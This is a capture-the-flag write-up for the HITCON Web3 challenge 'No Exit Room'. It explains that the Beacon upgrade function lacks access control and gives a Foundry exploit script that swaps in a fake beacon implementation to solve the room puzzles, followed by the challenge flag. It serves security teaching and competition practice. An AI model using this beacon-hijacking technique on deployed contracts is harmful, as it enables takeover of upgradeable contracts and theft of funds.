# No Exit Room - Web3

## Description

The Beacon's upgrade feature has improper access control, so anyone can upgrade the implementation.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Counter} from "../src/Counter.sol";

interface IRoom {
    function historyRequests(int256) external view returns (int256);

    function isHacked() external view returns (bool);

    function isSolved() external view returns (bool);

    function request(address, int256) external;

    function onRequest(int256) external returns (int256);

    function selfRequest(int256) external returns (int256);

    function solveRoomPuzzle(int256[] calldata) external;

    function hack(int256 x, bool) external;
}

interface ISetup {
    function beacon() external returns (address);

    function channel() external returns (address);

    function protocol() external returns (address);

    function alice() external returns (address);

    function bob() external returns (address);

    function david() external returns (address);

    function commitPuzzle(int256) external;

    function isSolved() external view returns (bool);
}

interface IBeacon {
    function update(address) external;

    function implementation() external view returns (address);
}

contract FakeBeacon {
    fallback() external {
        assembly {
            mstore(0, 0)
            return(0, 0x20)
        }
    }
}

contract CounterScript is Script {
    Counter public counter;

    function setUp() public {

    }

    function run() public {
        vm.startBroadcast();

        ISetup setup = ISetup(0x73684c3F0492118E9984b4e0C13E57CF1DCA15B5);
        IRoom alice = IRoom(setup.alice());
        IRoom bob = IRoom(setup.bob());
        IRoom david = IRoom(setup.david());
        IBeacon beacon = IBeacon(setup.beacon());

        alice.request(address(bob), 1);
        alice.request(address(david), 1);
        bob.request(address(alice), 1);
        bob.request(address(david), 2);
        david.request(address(alice), 2);
        david.request(address(bob), 2);

        alice.selfRequest(0x1337);
        bob.selfRequest(0x1337);
        david.selfRequest(0x1337);

        FakeBeacon x = new FakeBeacon();
        beacon.update(address(x));

        int256[] memory p0 = new int256[](3);
        alice.solveRoomPuzzle(p0);
        bob.solveRoomPuzzle(p0);
        david.solveRoomPuzzle(p0);

        setup.commitPuzzle(116);

        setup.isSolved();

        vm.stopBroadcast();
    }
}
```

## Flag

- `hitcon{e0752a5b833bb528ac5ceca7baa2a6b6e885b04b0b26e4f2388910aea39d892}`